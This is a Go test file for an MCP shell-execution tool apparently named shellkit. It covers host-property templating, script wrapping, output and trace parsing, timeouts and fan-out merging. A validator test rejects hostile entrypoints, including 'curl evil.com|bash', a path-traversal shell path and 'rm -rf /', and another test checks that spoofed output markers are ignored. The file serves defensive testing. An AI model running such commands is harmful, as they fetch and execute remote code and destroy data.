package mcp

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/caoer/shellkit/internal/inventory"
	"github.com/caoer/shellkit/internal/sshconn"
)

// --- Output Store tests ---

func TestOutputStore_AllHostProperties(t *testing.T) {
	servers := []inventory.Server{
		{
			Name:        "test-host",
			IP:          "10.0.0.1",
			Port:        2222,
			User:        "deploy",
			TailscaleIP: "100.64.0.1",
			PrivateIP:   "192.168.1.10",
			WGIP:        "10.100.0.50",
			EasytierIP:  "10.144.144.1",
			Provider:    "example-cloud",
		},
	}
	store, err := NewOutputStore(servers)
	if err != nil {
		t.Fatal(err)
	}

	tests := []struct {
		expr string
		want string
	}{
		{"{{test-host.wan_ip}}", "10.0.0.1"},
		{"{{test-host.user}}", "deploy"},
		{"{{test-host.port}}", "2222"},
		{"{{test-host.tailscale_ip}}", "100.64.0.1"},
		{"{{test-host.lan_ip}}", "192.168.1.10"},
		{"{{test-host.wireguard_ip}}", "10.100.0.50"},
		{"{{test-host.easytier_ip}}", "10.144.144.1"},
	}

	for _, tt := range tests {
		resolved, err := store.Resolve(tt.expr)
		if err != nil {
			t.Errorf("resolve %s: %v", tt.expr, err)
			continue
		}
		if resolved != tt.want {
			t.Errorf("resolve %s: want %s, got %s", tt.expr, tt.want, resolved)
		}
	}
}

func TestOutputStore_DefaultUser(t *testing.T) {
	servers := []inventory.Server{{Name: "no-user", IP: "1.2.3.4"}}
	store, _ := NewOutputStore(servers)

	resolved, err := store.Resolve("{{no-user.user}}")
	if err != nil {
		t.Fatal(err)
	}
	if resolved != "root" {
		t.Errorf("default user: want root, got %s", resolved)
	}
}

func TestOutputStore_DefaultPort(t *testing.T) {
	servers := []inventory.Server{{Name: "no-port", IP: "1.2.3.4"}}
	store, _ := NewOutputStore(servers)

	resolved, err := store.Resolve("{{no-port.port}}")
	if err != nil {
		t.Fatal(err)
	}
	if resolved != "22" {
		t.Errorf("default port: want 22, got %s", resolved)
	}
}

func TestValidateEntrypoint(t *testing.T) {
	for _, ep := range []string{"bash", "sh", "python3", "node", "deno", "bun", "ruby", "perl", "zsh"} {
		if err := validateEntrypoint(ep); err != nil {
			t.Errorf("valid entrypoint %q rejected: %v", ep, err)
		}
	}
	for _, ep := range []string{"curl evil.com|bash", "../../../bin/sh", "rm -rf /", ""} {
		if err := validateEntrypoint(ep); err == nil {
			t.Errorf("invalid entrypoint %q should be rejected", ep)
		}
	}
}

func TestOutputStore_UnknownStep(t *testing.T) {
	store, _ := NewOutputStore(nil)
	_, err := store.Resolve("{{nonexistent.output}}")
	if err == nil {
		t.Fatal("want error for unknown step")
	}
	if !strings.Contains(err.Error(), "not found") {
		t.Errorf("error should mention 'not found', got: %s", err)
	}
}

func TestOutputStore_UnknownHostProperty(t *testing.T) {
	servers := []inventory.Server{{Name: "host-1", IP: "1.2.3.4"}}
	store, _ := NewOutputStore(servers)
	_, err := store.Resolve("{{host-1.bogus}}")
	if err == nil {
		t.Fatal("want error for unknown property")
	}
	if !strings.Contains(err.Error(), "unknown host property") {
		t.Errorf("error should mention 'unknown host property', got: %s", err)
	}
}

func TestOutputStore_UnknownOutputKey(t *testing.T) {
	store, _ := NewOutputStore(nil)
	store.Store(&StepResult{
		Name:    "step-a",
		Outputs: map[string]string{"key1": "val1"},
	})
	_, err := store.Resolve("{{step-a.outputs.missing}}")
	if err == nil {
		t.Fatal("want error for unknown output key")
	}
}

func TestOutputStore_GoTemplatePassthrough(t *testing.T) {
	store, _ := NewOutputStore(nil)
	// A shellkit reference is a dotted bare identifier. Anything else — Go
	// template actions, bare keywords — is not ours and must pass through
	// untouched so `docker inspect -f '...'` style audits run cleanly.
	cases := []string{
		`{{nodots}}`,                                  // bare keyword (e.g. {{end}})
		`{{.NetworkSettings.Ports}}`,                  // leading dot
		`{{json .NetworkSettings.Ports}}`,             // function + arg (whitespace)
		`{{range $p, $c := .Ports}}{{$p}}{{end}}`,     // range/var/end
		`{{index .NetworkSettings.Ports "5432/tcp"}}`, // index with quoted key
	}
	for _, in := range cases {
		got, err := store.Resolve(in)
		if err != nil {
			t.Errorf("Resolve(%q): unexpected error %v", in, err)
		}
		if got != in {
			t.Errorf("Resolve(%q): want passthrough, got %q", in, got)
		}
	}
}

func TestOutputStore_FanoutPerHostLookup(t *testing.T) {
	store, _ := NewOutputStore(nil)

	store.Store(&StepResult{
		Name:     "deploy",
		Host:     "host-a",
		FilePath: "/tmp/deploy.host-a.out",
		Outputs:  map[string]string{"status": "ok"},
	})
	store.Store(&StepResult{
		Name:     "deploy",
		Host:     "host-b",
		FilePath: "/tmp/deploy.host-b.out",
		Outputs:  map[string]string{"status": "failed"},
	})

	// per-host output key
	resolved, err := store.Resolve("{{deploy.host-a.outputs.status}}")
	if err != nil {
		t.Fatalf("per-host output: %v", err)
	}
	if resolved != "ok" {
		t.Errorf("host-a status: want ok, got %s", resolved)
	}

	// per-host file path
	resolved, err = store.Resolve("{{deploy.host-a.output}}")
	if err != nil {
		t.Fatalf("per-host file: %v", err)
	}
	if resolved != "/tmp/deploy.host-a.out" {
		t.Errorf("host-a output: want /tmp/deploy.host-a.out, got %s", resolved)
	}
}

func TestOutputStore_LiteralSubstitution(t *testing.T) {
	store, _ := NewOutputStore(nil)
	store.Store(&StepResult{
		Name:    "cmd",
		Outputs: map[string]string{"msg": "hello world"},
	})

	resolved, err := store.Resolve("echo {{cmd.outputs.msg}}")
	if err != nil {
		t.Fatal(err)
	}
	if resolved != "echo hello world" {
		t.Errorf("want literal substitution, got: %s", resolved)
	}
}

func TestOutputStore_ChainedOutputsNoQuoteAccumulation(t *testing.T) {
	store, _ := NewOutputStore(nil)
	store.Store(&StepResult{
		Name:    "step-1",
		Outputs: map[string]string{"seed": "alpha"},
	})

	resolved, err := store.Resolve("echo derived={{step-1.outputs.seed}}-beta")
	if err != nil {
		t.Fatal(err)
	}
	if resolved != "echo derived=alpha-beta" {
		t.Errorf("chained output should not accumulate quotes, got: %s", resolved)
	}
}

func TestOutputStore_ServerLookupByAlias(t *testing.T) {
	servers := []inventory.Server{
		{Name: "compute-01", SSHAlias: "dev-2", IP: "203.0.113.4", Provider: "example-cloud"},
	}
	store, _ := NewOutputStore(servers)

	resolved, err := store.Resolve("{{dev-2.wan_ip}}")
	if err != nil {
		t.Fatal(err)
	}
	if resolved != "203.0.113.4" {
		t.Errorf("alias lookup: want 203.0.113.4, got %s", resolved)
	}
}

func TestOutputStore_ServerLookupByName(t *testing.T) {
	servers := []inventory.Server{
		{Name: "node-01", Provider: "example-cloud", IP: "203.0.113.8"},
	}
	store, _ := NewOutputStore(servers)

	resolved, err := store.Resolve("{{node-01.wan_ip}}")
	if err != nil {
		t.Fatal(err)
	}
	if resolved != "203.0.113.8" {
		t.Errorf("name lookup: want 203.0.113.8, got %s", resolved)
	}
}

func TestOutputStore_EmptyValue(t *testing.T) {
	store, _ := NewOutputStore(nil)
	store.Store(&StepResult{
		Name:     "cmd",
		FilePath: "",
	})

	resolved, err := store.Resolve("cat {{cmd.output}}")
	if err != nil {
		t.Fatal(err)
	}
	if resolved != "cat " {
		t.Errorf("empty value: want \"cat \", got %q", resolved)
	}
}

// --- Executor unit tests ---

func TestWrapScript_Bash(t *testing.T) {
	nonce := "test123"
	script := `echo "hello"
echo "pid=123" >> $OUTPUT`
	wrapped := wrapScript(script, "bash", nonce)

	if !strings.Contains(wrapped, outputMarkerFor(nonce)) {
		t.Error("should contain nonce-based output marker")
	}
	if !strings.Contains(wrapped, stderrMarkerFor(nonce)) {
		t.Error("should contain nonce-based stderr marker")
	}
	if !strings.Contains(wrapped, "_SSH_OUTPUT=$(mktemp)") {
		t.Error("should create temp output file")
	}
	if !strings.Contains(wrapped, script) {
		t.Error("should contain the original script body")
	}
}

func TestWrapScript_NonBash(t *testing.T) {
	nonce := "test456"
	script := `import os
print("hello")`
	wrapped := wrapScript(script, "python3", nonce)

	if !strings.Contains(wrapped, "python3 $_SSH_SCRIPT") {
		t.Error("should invoke entrypoint with script file")
	}
	if !strings.Contains(wrapped, "_SSH_SCRIPT=$(mktemp)") {
		t.Error("should create temp script file")
	}
	if !strings.Contains(wrapped, heredocDelimiter(nonce)) {
		t.Error("should use nonce-based heredoc delimiter")
	}
	if !strings.Contains(wrapped, script) {
		t.Error("should contain the original script body verbatim")
	}
}

func TestWrapScript_Sh(t *testing.T) {
	nonce := "test789"
	wrapped := wrapScript("echo test", "sh", nonce)
	if !strings.Contains(wrapped, "echo test") {
		t.Error("sh wrap should contain script body")
	}
	if !strings.Contains(wrapped, outputMarkerFor(nonce)) {
		t.Error("sh wrap should contain output marker")
	}
}

func TestWrapperShell_NonShellEntrypointsRunWrapperUnderBash(t *testing.T) {
	// The wrapScript wrapper is shell code; the entrypoint is applied inside it.
	// Feeding the wrapper to python3/node broke remotely (python3 -s parses the
	// bash setup as Python → SyntaxError; node rejects -s outright). Non-shell
	// entrypoints must resolve the WRAPPER interpreter to bash.
	for _, ep := range []string{"python3", "python", "node", "deno", "bun", "ruby", "perl"} {
		if got := wrapperShell(ep); got != "bash" {
			t.Errorf("wrapperShell(%q) = %q, want bash (wrapper is shell code)", ep, got)
		}
	}
	// Shell entrypoints keep executing their own wrapper — byte-for-byte legacy.
	for _, ep := range []string{"bash", "sh", "zsh"} {
		if got := wrapperShell(ep); got != ep {
			t.Errorf("wrapperShell(%q) = %q, want %q", ep, got, ep)
		}
	}
	if got := wrapperShell(""); got != "bash" {
		t.Errorf("wrapperShell(\"\") = %q, want bash (default entrypoint)", got)
	}
}

func TestWrapScript_StdbufUnbuffering(t *testing.T) {
	wrapped := wrapScript("echo hi", "bash", "n1")
	if !strings.Contains(wrapped, `command -v stdbuf`) {
		t.Error("wrapper should probe for stdbuf")
	}
	if !strings.Contains(wrapped, `_UNBUF="stdbuf -oL"`) {
		t.Error("wrapper should set _UNBUF to stdbuf -oL when available")
	}
	if !strings.Contains(wrapped, "$_UNBUF bash $_SSH_SCRIPT") {
		t.Error("wrapper should invoke entrypoint via $_UNBUF")
	}
}

func TestParseWrappedOutput_Full(t *testing.T) {
	nonce := "abc123"
	outM := outputMarkerFor(nonce)
	errM := stderrMarkerFor(nonce)
	raw := "line 1\nline 2\n\n" + outM + "\nkey1=val1\nkey2=val2\n" + errM + "\nsome error\n"
	stdout, outputs, stderr := parseWrappedOutputNonce(raw, nonce)

	if !strings.Contains(stdout, "line 1") {
		t.Errorf("stdout should contain 'line 1', got %q", stdout)
	}
	if !strings.Contains(outputs, "key1=val1") {
		t.Errorf("outputs should contain key1=val1, got %q", outputs)
	}
	if !strings.Contains(stderr, "some error") {
		t.Errorf("stderr should contain 'some error', got %q", stderr)
	}
}

func TestParseWrappedOutput_PreservesTrailingNewline(t *testing.T) {
	nonce := "newline1"
	outM := outputMarkerFor(nonce)
	errM := stderrMarkerFor(nonce)
	raw := "line1\nline2\nline3\n\n" + outM + "\n" + errM + "\n"
	stdout, _, _ := parseWrappedOutputNonce(raw, nonce)

	if !strings.HasSuffix(stdout, "line3\n") {
		t.Errorf("stdout should preserve trailing newline after last content line, got %q", stdout)
	}
	lines := strings.Split(strings.TrimSuffix(stdout, "\n"), "\n")
	if len(lines) != 3 {
		t.Errorf("want 3 lines, got %d: %q", len(lines), stdout)
	}
}

func TestParseWrappedOutput_NoMarkers(t *testing.T) {
	raw := "just plain stdout\nno markers here"
	stdout, outputs, stderr := parseWrappedOutputNonce(raw, "nonce")

	if stdout != raw {
		t.Errorf("stdout should be raw input, got %q", stdout)
	}
	if outputs != "" {
		t.Errorf("outputs should be empty, got %q", outputs)
	}
	if stderr != "" {
		t.Errorf("stderr should be empty, got %q", stderr)
	}
}

func TestParseWrappedOutput_OutputsOnly(t *testing.T) {
	nonce := "onlyout"
	outM := outputMarkerFor(nonce)
	raw := "stdout\n\n" + outM + "\nkey=val\n"
	stdout, outputs, stderr := parseWrappedOutputNonce(raw, nonce)

	if !strings.Contains(stdout, "stdout") {
		t.Errorf("stdout: got %q", stdout)
	}
	if outputs != "key=val" {
		t.Errorf("outputs: want 'key=val', got %q", outputs)
	}
	if stderr != "" {
		t.Errorf("stderr should be empty, got %q", stderr)
	}
}

func TestParseWrappedOutput_EmptyOutputs(t *testing.T) {
	nonce := "emptyout"
	outM := outputMarkerFor(nonce)
	errM := stderrMarkerFor(nonce)
	raw := "stdout\n\n" + outM + "\n" + errM + "\nerror msg\n"
	_, outputs, stderr := parseWrappedOutputNonce(raw, nonce)

	if outputs != "" {
		t.Errorf("outputs should be empty, got %q", outputs)
	}
	if !strings.Contains(stderr, "error msg") {
		t.Errorf("stderr: got %q", stderr)
	}
}

func TestParseWrappedOutput_MarkerAtEnd(t *testing.T) {
	nonce := "endtest"
	outM := outputMarkerFor(nonce)
	raw := "some output\n" + outM
	stdout, outputs, stderr := parseWrappedOutputNonce(raw, nonce)

	if !strings.Contains(stdout, "some output") {
		t.Errorf("stdout: got %q", stdout)
	}
	if outputs != "" {
		t.Errorf("outputs should be empty, got %q", outputs)
	}
	if stderr != "" {
		t.Errorf("stderr should be empty, got %q", stderr)
	}
}

func TestParseWrappedOutput_SpoofedMarker(t *testing.T) {
	nonce := "real123"
	outM := outputMarkerFor(nonce)
	errM := stderrMarkerFor(nonce)
	// static marker without nonce should NOT trigger parsing
	raw := "output\n---SHELLKIT-OUTPUTS---\nspoofed=bad\n" + outM + "\nreal=good\n" + errM + "\n"
	stdout, outputs, stderr := parseWrappedOutputNonce(raw, nonce)

	_ = stderr
	if !strings.Contains(stdout, "spoofed=bad") {
		t.Error("static marker (no nonce) should be in stdout, not parsed as outputs")
	}
	if !strings.Contains(outputs, "real=good") {
		t.Errorf("real outputs should contain 'real=good', got %q", outputs)
	}
}

func TestMatchFilter_AllKeys(t *testing.T) {
	srv := inventory.Server{
		Name:     "test-srv",
		Provider: "example-cloud",
		Role:     "web",
		Project:  "myapp",
		Location: "nyc",
		State:    "running",
		Group:    "prod",
	}

	tests := []struct {
		filter string
		want   bool
	}{
		{"provider=example-cloud", true},
		{"provider=aws", false},
		{"role=web", true},
		{"role=db", false},
		{"project=myapp", true},
		{"location=nyc", true},
		{"state=running", true},
		{"group=prod", true},
		{"group=staging", false},
	}

	for _, tt := range tests {
		got := matchFilter(srv, tt.filter)
		if got != tt.want {
			t.Errorf("matchFilter(%q): want %v, got %v", tt.filter, tt.want, got)
		}
	}
}

func TestMatchFilter_Substring(t *testing.T) {
	srv := inventory.Server{Name: "web-1", SSHAlias: "compute-alias"}

	if !matchFilter(srv, "web") {
		t.Error("substring match should find 'web' in name")
	}
	if !matchFilter(srv, "compute") {
		t.Error("substring match should find 'compute' in alias")
	}
	if matchFilter(srv, "sfo") {
		t.Error("substring match should not find 'sfo'")
	}
}

func TestMatchFilter_UnknownKey(t *testing.T) {
	srv := inventory.Server{Name: "test"}
	if matchFilter(srv, "bogus=value") {
		t.Error("unknown filter key should return false")
	}
}

func TestExecuteList_Empty(t *testing.T) {
	store, _ := NewOutputStore(nil)
	exec := NewExecutor(store, nil)

	step := &Step{Name: "list-empty", Action: ActionList}
	result := exec.executeList(step)

	if result.ExitCode != 0 {
		t.Errorf("exit code: want 0, got %d", result.ExitCode)
	}
	if result.Outputs["count"] != "0" {
		t.Errorf("count: want 0, got %s", result.Outputs["count"])
	}
}

func TestExecuteList_WithFilter(t *testing.T) {
	servers := []inventory.Server{
		{Name: "web-1", Provider: "aws", Role: "web", IP: "1.1.1.1", Location: "nyc"},
		{Name: "web-2", Provider: "aws", Role: "web", IP: "1.1.1.2", Location: "sfo"},
		{Name: "db-1", Provider: "aws", Role: "db", IP: "1.1.1.3", Location: "nyc"},
	}
	store, _ := NewOutputStore(servers)
	exec := NewExecutor(store, servers)

	step := &Step{Name: "web-only", Action: ActionList, Config: StepConfig{Filter: "role=web"}}
	result := exec.executeList(step)

	if result.Outputs["count"] != "2" {
		t.Errorf("count: want 2, got %s", result.Outputs["count"])
	}
}

func TestLocalExecution_NonZeroExit(t *testing.T) {
	store, _ := NewOutputStore(nil)
	exec := NewExecutor(store, nil)

	step := Step{Name: "fail", Action: ActionLocal, Body: "exit 42"}
	results, err := exec.executeLocal(context.Background(), 0, &step)
	if err != nil {
		t.Fatal(err)
	}
	if len(results) != 1 {
		t.Fatalf("want 1 result, got %d", len(results))
	}
	if results[0].ExitCode != 42 {
		t.Errorf("exit code: want 42, got %d", results[0].ExitCode)
	}
}

func TestLocalExecution_Timeout(t *testing.T) {
	store, _ := NewOutputStore(nil)
	exec := NewExecutor(store, nil)

	step := Step{
		Name:   "slow",
		Action: ActionLocal,
		Body:   "sleep 30",
		Config: StepConfig{Timeout: 1},
	}

	start := time.Now()
	results, err := exec.executeLocal(context.Background(), 0, &step)
	elapsed := time.Since(start)

	if err != nil {
		t.Fatal(err)
	}
	if elapsed > 5*time.Second {
		t.Errorf("timeout didn't fire — took %v", elapsed)
	}
	if results[0].ExitCode == 0 {
		t.Error("timed-out command should have non-zero exit")
	}
}

func TestShouldTrace(t *testing.T) {
	// Trace is now always-on for bash and unavailable for other entrypoints.
	// The DSL `trace` field is retained as a display-only knob (handled in
	// formatResults) and intentionally ignored at the collection layer so the
	// live dashboard always has data to render.
	trueVal := true
	falseVal := false

	tests := []struct {
		config     StepConfig
		entrypoint string
		want       bool
	}{
		{StepConfig{}, "bash", true},
		{StepConfig{}, "python3", false},
		{StepConfig{}, "sh", false},
		{StepConfig{Trace: &trueVal}, "python3", false}, // ignored
		{StepConfig{Trace: &falseVal}, "bash", true},    // ignored
	}
	for _, tt := range tests {
		got := shouldTrace(tt.config, tt.entrypoint)
		if got != tt.want {
			t.Errorf("shouldTrace(%v, %q): want %v, got %v", tt.config.Trace, tt.entrypoint, tt.want, got)
		}
	}
}

func TestPrependTrace(t *testing.T) {
	nonce := "abc123"
	body := "echo hello\nsleep 5"
	result := prependTrace(body, nonce)

	marker := traceMarkerFor(nonce)
	if !strings.Contains(result, marker) {
		t.Error("prepended body should contain trace marker")
	}
	if !strings.Contains(result, "trap") {
		t.Error("prepended body should contain trap command")
	}
	if !strings.Contains(result, "$BASH_COMMAND") {
		t.Error("prepended body should reference $BASH_COMMAND")
	}
	if !strings.Contains(result, body) {
		t.Error("prepended body should contain original script")
	}
}

func TestExtractTrace(t *testing.T) {
	nonce := "test789"
	marker := traceMarkerFor(nonce)

	raw := fmt.Sprintf("%s 0 echo hello\nhello\n%s 0 sleep 5\n%s 5 echo done\ndone\n",
		marker, marker, marker)

	clean, trace := extractTrace(raw, nonce)

	if len(trace) != 3 {
		t.Fatalf("want 3 trace entries, got %d", len(trace))
	}
	if trace[0].Command != "echo hello" {
		t.Errorf("trace[0].Command: want 'echo hello', got %q", trace[0].Command)
	}
	if trace[1].ElapsedSec != 0 {
		t.Errorf("trace[1].ElapsedSec: want 0, got %d", trace[1].ElapsedSec)
	}
	if trace[2].ElapsedSec != 5 {
		t.Errorf("trace[2].ElapsedSec: want 5, got %d", trace[2].ElapsedSec)
	}

	if !strings.Contains(clean, "hello") {
		t.Error("clean stdout should contain 'hello'")
	}
	if !strings.Contains(clean, "done") {
		t.Error("clean stdout should contain 'done'")
	}
	if strings.Contains(clean, marker) {
		t.Error("clean stdout should not contain trace markers")
	}
}

func TestExtractTrace_MidLine(t *testing.T) {
	nonce := "d15931543a0fd4ab"
	marker := traceMarkerFor(nonce)

	// Simulate echo -n "TCP: " followed by trap output on the same line,
	// then curl result concatenated with next trap output (no trailing newline).
	raw := fmt.Sprintf("%s 0 5 echo -n \"TCP: \"\nTCP: %s 2 40 curl http://example.com\n1.2.3.4%s 2 41 echo \"\"\n\n",
		marker, marker, marker)

	clean, trace := extractTrace(raw, nonce)

	if len(trace) != 3 {
		t.Fatalf("want 3 trace entries, got %d", len(trace))
	}
	if strings.Contains(clean, marker) {
		t.Errorf("clean stdout should not contain trace marker, got:\n%s", clean)
	}
	if !strings.Contains(clean, "TCP: ") {
		t.Error("clean stdout should preserve 'TCP: ' prefix from echo -n")
	}
	if !strings.Contains(clean, "1.2.3.4") {
		t.Error("clean stdout should preserve '1.2.3.4' prefix from curl output")
	}
}

func TestExtractTrace_Empty(t *testing.T) {
	clean, trace := extractTrace("just stdout\nno markers", "nonce123")
	if len(trace) != 0 {
		t.Errorf("want 0 trace entries, got %d", len(trace))
	}
	if !strings.Contains(clean, "just stdout") {
		t.Error("clean stdout should be unchanged")
	}
}

func TestLocalExecution_TimeoutWithTrace(t *testing.T) {
	store, _ := NewOutputStore(nil)
	exec := NewExecutor(store, nil)

	step := Step{
		Name:   "traced-slow",
		Action: ActionLocal,
		Body:   "echo before\nsleep 30\necho after",
		Config: StepConfig{Timeout: 2},
	}

	start := time.Now()
	results, err := exec.executeLocal(context.Background(), 0, &step)
	elapsed := time.Since(start)

	if err != nil {
		t.Fatal(err)
	}
	if elapsed > 10*time.Second {
		t.Errorf("timeout didn't fire — took %v", elapsed)
	}

	r := results[0]
	if !r.TimedOut {
		t.Error("result should be marked as timed out")
	}
	if r.ExitCode != 137 {
		t.Errorf("exit code: want 137, got %d", r.ExitCode)
	}
	if len(r.Trace) == 0 {
		t.Error("timed out result should have trace entries")
	}

	// last trace entry should be sleep (the command that was running at timeout)
	lastCmd := r.Trace[len(r.Trace)-1].Command
	if !strings.Contains(lastCmd, "sleep") {
		t.Errorf("last trace command should be 'sleep 30', got %q", lastCmd)
	}

	// stdout should contain "before" but not "after"
	if !strings.Contains(r.Stdout, "before") {
		t.Errorf("stdout should contain 'before', got %q", r.Stdout)
	}
}

func TestLocalExecution_TraceFieldIgnored(t *testing.T) {
	// The `trace: false` config field is now display-only and does NOT
	// suppress trace collection. The live dashboard relies on always-on
	// collection to render the executing line. This test pins that contract.
	store, _ := NewOutputStore(nil)
	exec := NewExecutor(store, nil)

	falseVal := false
	step := Step{
		Name:   "trace-false-ignored",
		Action: ActionLocal,
		Body:   "echo hello",
		Config: StepConfig{Trace: &falseVal},
	}

	results, err := exec.executeLocal(context.Background(), 0, &step)
	if err != nil {
		t.Fatal(err)
	}

	r := results[0]
	if len(r.Trace) == 0 {
		t.Error("trace should still be collected even when config.Trace=false (it's a display knob now)")
	}
	if !strings.Contains(r.Stdout, "hello") {
		t.Errorf("stdout should contain 'hello', got %q", r.Stdout)
	}
}

func TestFormatResults_WithTimeout(t *testing.T) {
	store, _ := NewOutputStore(nil)
	results := []StepResult{
		{
			Name:       "slow-step",
			ExitCode:   137,
			TimedOut:   true,
			TimeoutSec: 30,
			Trace: []TraceLine{
				{ElapsedSec: 0, Command: "echo starting"},
				{ElapsedSec: 0, Command: "apt-get update"},
				{ElapsedSec: 12, Command: "curl http://slow.example.com"},
			},
		},
	}

	formatted := formatResults(results, store)

	if !strings.Contains(formatted, "TIMED OUT (after 30s)") {
		t.Error("should contain TIMED OUT with duration")
	}
	if !strings.Contains(formatted, "command trace (timed out):") {
		t.Error("should contain command trace header with timeout label")
	}
	if !strings.Contains(formatted, "timed out here") {
		t.Error("should mark last command as timeout point")
	}
	if !strings.Contains(formatted, "echo starting") {
		t.Error("should show traced commands")
	}
	if !strings.Contains(formatted, "(12s)") {
		t.Error("should show duration for apt-get update (12s)")
	}
}

func TestFormatResults_ShowTraceExplicit(t *testing.T) {
	store, _ := NewOutputStore(nil)
	results := []StepResult{
		{
			Name:      "traced-ok",
			ExitCode:  0,
			ShowTrace: true,
			Trace: []TraceLine{
				{ElapsedSec: 0, Command: "echo starting"},
				{ElapsedSec: 1, Command: "apt-get update"},
				{ElapsedSec: 5, Command: "echo done"},
			},
		},
	}

	formatted := formatResults(results, store)

	if !strings.Contains(formatted, "command trace:") {
		t.Error("should contain command trace header when ShowTrace=true")
	}
	if strings.Contains(formatted, "timed out") {
		t.Error("should NOT contain timeout label for non-timeout trace")
	}
	if !strings.Contains(formatted, "echo starting") {
		t.Error("should show traced commands")
	}
	if !strings.Contains(formatted, "echo done") {
		t.Error("should show last traced command")
	}
}

func TestFormatResults_NoTraceWithoutFlag(t *testing.T) {
	store, _ := NewOutputStore(nil)
	results := []StepResult{
		{
			Name:     "silent-ok",
			ExitCode: 0,
			// ShowTrace=false (default), not timed out
			Trace: []TraceLine{
				{ElapsedSec: 0, Command: "echo hidden"},
			},
		},
	}

	formatted := formatResults(results, store)

	if strings.Contains(formatted, "command trace") {
		t.Error("should NOT show trace when ShowTrace=false and not timed out")
	}
	if strings.Contains(formatted, "echo hidden") {
		t.Error("trace commands should be hidden")
	}
}

func TestExecute_AbortOnFailure(t *testing.T) {
	store, _ := NewOutputStore(nil)
	exec := NewExecutor(store, nil)

	steps := []Step{
		{Name: "ok", Action: ActionLocal, Body: "echo ok"},
		{Name: "fail", Action: ActionLocal, Body: "exit 1"},
		{Name: "never", Action: ActionLocal, Body: "echo never"},
	}

	results, err := exec.Execute(context.Background(), steps)
	if err != nil {
		t.Fatal(err)
	}

	// should have ok + fail, but not never
	names := make(map[string]bool)
	for _, r := range results {
		names[r.Name] = true
	}
	if !names["ok"] {
		t.Error("'ok' step should be in results")
	}
	if !names["fail"] {
		t.Error("'fail' step should be in results")
	}
	if names["never"] {
		t.Error("'never' step should NOT be in results (aborted)")
	}
}

func TestExecute_ContinueOnError(t *testing.T) {
	store, _ := NewOutputStore(nil)
	exec := NewExecutor(store, nil)

	steps := []Step{
		{Name: "ok", Action: ActionLocal, Body: "echo ok"},
		{Name: "fail", Action: ActionLocal, Body: "exit 1", Config: StepConfig{ContinueOnError: true}},
		{Name: "after", Action: ActionLocal, Body: "echo after"},
	}

	results, err := exec.Execute(context.Background(), steps)
	if err != nil {
		t.Fatal(err)
	}

	names := make(map[string]bool)
	for _, r := range results {
		names[r.Name] = true
	}
	if !names["after"] {
		t.Error("'after' step should run when continue_on_error=true on failed step")
	}
}

func TestLocalExecution_OutputCapture(t *testing.T) {
	store, _ := NewOutputStore(nil)
	exec := NewExecutor(store, nil)

	step := Step{
		Name:   "capture",
		Action: ActionLocal,
		Body:   `echo "hello world"; echo "version=1.2.3" >> $OUTPUT; echo "status=ok" >> $OUTPUT`,
	}
	results, err := exec.executeLocal(context.Background(), 0, &step)
	if err != nil {
		t.Fatal(err)
	}

	r := results[0]
	if r.ExitCode != 0 {
		t.Errorf("exit: want 0, got %d (stderr: %s)", r.ExitCode, r.Stderr)
	}
	if r.Outputs["version"] != "1.2.3" {
		t.Errorf("version: want 1.2.3, got %q", r.Outputs["version"])
	}
	if r.Outputs["status"] != "ok" {
		t.Errorf("status: want ok, got %q", r.Outputs["status"])
	}
	if !strings.Contains(r.Stdout, "hello world") {
		t.Errorf("stdout should contain 'hello world', got %q", r.Stdout)
	}
}

func TestLocalExecution_TemplateResolution(t *testing.T) {
	servers := []inventory.Server{{Name: "host-1", IP: "10.0.0.1"}}
	store, _ := NewOutputStore(servers)
	exec := NewExecutor(store, servers)

	// first step captures output
	step1 := Step{Name: "step1", Action: ActionLocal, Body: `echo "addr=10.0.0.1" >> $OUTPUT`}
	results1, err := exec.executeLocal(context.Background(), 0, &step1)
	if err != nil {
		t.Fatal(err)
	}
	for i := range results1 {
		store.Store(&results1[i])
	}

	// second step references first step's output
	step2 := Step{Name: "step2", Action: ActionLocal, Body: `echo "connecting to {{step1.outputs.addr}}"`}
	results2, err := exec.executeLocal(context.Background(), 0, &step2)
	if err != nil {
		t.Fatal(err)
	}

	if results2[0].ExitCode != 0 {
		t.Errorf("exit: want 0, got %d (stderr: %s)", results2[0].ExitCode, results2[0].Stderr)
	}
}

func TestLocalExecution_HostPropertyInTemplate(t *testing.T) {
	servers := []inventory.Server{{Name: "web-1", IP: "10.0.0.5"}}
	store, _ := NewOutputStore(servers)
	exec := NewExecutor(store, servers)

	step := Step{Name: "resolve-ip", Action: ActionLocal, Body: `echo {{web-1.wan_ip}}`}
	results, err := exec.executeLocal(context.Background(), 0, &step)
	if err != nil {
		t.Fatal(err)
	}
	if results[0].ExitCode != 0 {
		t.Errorf("exit: want 0, got %d (stderr: %s)", results[0].ExitCode, results[0].Stderr)
	}
	if !strings.Contains(results[0].Stdout, "10.0.0.5") {
		t.Errorf("stdout should contain IP, got %q", results[0].Stdout)
	}
}

func TestMergeFanoutOutputs(t *testing.T) {
	store, _ := NewOutputStore(nil)
	exec := NewExecutor(store, nil)

	perHost := []StepResult{
		{Name: "deploy", Host: "host-a", Stdout: "output from a\n"},
		{Name: "deploy", Host: "host-b", Stdout: "output from b\n"},
	}

	merged := exec.mergeFanoutOutputs("deploy", perHost)

	if !strings.Contains(merged.Stdout, "=== host-a ===") {
		t.Error("merged should contain host-a delimiter")
	}
	if !strings.Contains(merged.Stdout, "=== host-b ===") {
		t.Error("merged should contain host-b delimiter")
	}
	if !strings.Contains(merged.Stdout, "output from a") {
		t.Error("merged should contain host-a output")
	}
	if merged.FilePath == "" {
		t.Error("merged should have a file path")
	}
}

func TestMergeFanoutOutputs_LastHostWins(t *testing.T) {
	store, _ := NewOutputStore(nil)
	exec := NewExecutor(store, nil)

	perHost := []StepResult{
		{Name: "deploy", Host: "host-a", Stdout: "a\n", Outputs: map[string]string{"pid": "100", "host": "a"}},
		{Name: "deploy", Host: "host-b", Stdout: "b\n", Outputs: map[string]string{"pid": "200", "host": "b"}},
	}

	merged := exec.mergeFanoutOutputs("deploy", perHost)

	if merged.Outputs["pid"] != "200" {
		t.Errorf("last-host-wins: pid want 200, got %s", merged.Outputs["pid"])
	}
	if merged.Outputs["host"] != "b" {
		t.Errorf("last-host-wins: host want b, got %s", merged.Outputs["host"])
	}
}

func TestMCPTruncate(t *testing.T) {
	short := "hello"
	if mcpTruncate(short, 100) != short {
		t.Error("short string should not be truncated")
	}

	long := strings.Repeat("x", 200)
	truncated := mcpTruncate(long, 50)
	if len(truncated) <= 50 {
